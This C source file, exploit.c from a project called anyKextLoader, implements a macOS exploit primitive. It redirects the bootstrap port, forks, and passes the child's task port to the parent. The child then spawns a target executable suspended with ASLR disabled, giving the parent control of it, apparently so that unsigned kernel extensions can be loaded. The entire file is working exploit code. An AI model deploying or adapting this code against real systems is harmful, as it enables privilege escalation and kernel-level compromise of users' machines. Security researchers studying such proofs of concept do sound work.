//
//  exploit.c
//  anyKextLoader
//
//  Created by Linus Henze on 30/07/15.
//  Copyright Â© 2016 Linus Henze. All rights reserved.
//

#include "exploit.h"
#include <stdlib.h>
#include <spawn.h>
#include <signal.h>
#include <unistd.h>

void __attribute__((noreturn)) startExeSuspended(char *exe, int argc, char * argv[]) {
    extern char **environ;
    
    int status;
    posix_spawnattr_t attr;
    status = posix_spawnattr_init (&attr);
    int ps_flags = 0;
    pid_t pid;
    
#ifndef _POSIX_SPAWN_DISABLE_ASLR
#define _POSIX_SPAWN_DISABLE_ASLR 0x0100
#endif
    ps_flags = POSIX_SPAWN_START_SUSPENDED;
    ps_flags |= _POSIX_SPAWN_DISABLE_ASLR;
    ps_flags |= POSIX_SPAWN_SETEXEC;
    status = posix_spawnattr_setflags (&attr, ps_flags);
    static int debug_setpgrp = 657473;
    int cpu = CPU_TYPE_X86_64;
    size_t copied = 0;
    status = posix_spawnattr_setbinpref_np(&attr, 1, &cpu, &copied);
    status = posix_spawnattr_setpgroup (&attr, debug_setpgrp);
    status = posix_spawnp(&pid, exe, NULL, &attr, &argv[0], environ);
    
    printf("posix_spawnp failed ???!!!\nKilling parent.\n");
    kill(getppid(), SIGKILL);
    exit(-1);
}

mach_port_t receivePort(mach_port_t recvPort) {
    kern_return_t kr;
    mach_message_recv rmsg;
    
    kr = mach_msg(&rmsg.header, MACH_RCV_MSG, 0, sizeof(mach_message_recv), recvPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        return MACH_PORT_NULL;
    }
    
    return rmsg.task_port.name;
}

bool sendPort(mach_port_t dest, mach_port_t send_port) {
    kern_return_t kr;
    mach_message msg;
    
    msg.header.msgh_remote_port = dest;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits =  MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(mach_message);
    msg.body.msgh_descriptor_count = 1;
    msg.task_port.name = send_port;
    msg.task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    kr = mach_msg_send(&msg.header);
    if (kr != KERN_SUCCESS) {
        return false;
    }
    
    return true;
}

mach_port_t forkAndGetTaskPortForProcess(pid_t *child_pid, char *exe, int argc, char * argv[]) {
    mach_port_t child_port = MACH_PORT_NULL;
    kern_return_t kr;
    mach_port_t realBootstrapPort = MACH_PORT_NULL;
    mach_port_t fakeBootstrapPort = MACH_PORT_NULL;
    pid_t childPid = -1;
    
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fakeBootstrapPort);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_allocate failed!\n");
        return MACH_PORT_NULL;
    }
    kr = mach_port_insert_right(mach_task_self(), fakeBootstrapPort, fakeBootstrapPort, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_insert_right failed! (Couldn't insert send right)\n");
        return MACH_PORT_NULL;
    }
    kr = task_get_bootstrap_port(mach_task_self(), &realBootstrapPort);
    if (kr != KERN_SUCCESS) {
        printf("task_get_bootstrap_port failed!\n");
        return MACH_PORT_NULL;
    }
    kr = task_set_bootstrap_port(mach_task_self(), fakeBootstrapPort);
    if (kr != KERN_SUCCESS) {
        printf("task_set_bootstrap_port failed!\n");
        return MACH_PORT_NULL;
    }
    
    switch (childPid = fork()) {
        case -1:
            printf("fork() failed!\n");
            mach_port_deallocate(mach_task_self(), fakeBootstrapPort);
            kr = task_set_bootstrap_port(mach_task_self(), realBootstrapPort);
            if (kr != KERN_SUCCESS) {
                printf("Couldn't reset bootstrap port!\n");
                exit(-1);
            }
            return MACH_PORT_NULL;
            
        case 0: /* Child */
            kr = task_get_bootstrap_port(mach_task_self(), &fakeBootstrapPort);
            if (kr != KERN_SUCCESS) {
                printf("task_get_bootstrap_port failed!\nKilling parent.\n");
                kill(getppid(), SIGKILL);
                exit(-1);
            }
            
            if (!sendPort(fakeBootstrapPort, mach_task_self())) {
                printf("Couldn't send my task port to parent!\nKilling parent.\n");
                kill(getppid(), SIGKILL);
                exit(-1);
            }
            mach_port_t myRecvPort = MACH_PORT_NULL;
            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &myRecvPort);
            if (kr != KERN_SUCCESS) {
                printf("mach_port_allocate failed!\nKilling parent.\n");
                kill(getppid(), SIGKILL);
                exit(-1);
            }
            kr = mach_port_insert_right(mach_task_self(), myRecvPort, myRecvPort, MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                printf("mach_port_insert_right failed! (Couldn't insert send right)\nKilling parent.\n");
                kill(getppid(), SIGKILL);
                exit(-1);
            }
            
            if (!sendPort(fakeBootstrapPort, myRecvPort)) {
                printf("Couldn't send my receive port to parent!\nKilling parent.\n");
                kill(getppid(), SIGKILL);
                exit(-1);
            }
            
            kr = task_set_bootstrap_port(mach_task_self(), receivePort(myRecvPort));
            if (kr != KERN_SUCCESS) {
                printf("Couldn't reset bootstrap port!\nKilling parent.\n");
                kill(getppid(), SIGKILL);
                exit(-1);
            }
            
            startExeSuspended(exe, argc, argv);
            
        default: /* Parent */
            kr = task_set_bootstrap_port(mach_task_self(), bootstrap_port);
            if (kr != KERN_SUCCESS) {
                printf("Couldn't reset bootstrap port!\n");
                exit(-1);
            }
            
            child_port = receivePort(fakeBootstrapPort);
            sendPort(receivePort(fakeBootstrapPort), bootstrap_port);
            sleep(1); // Wait for posix_spawnp
            kill(childPid, SIGCONT);
            usleep(1000);
            kill(childPid, SIGSTOP);
            *child_pid = childPid;
            return child_port;
    }
    
    return child_port;
}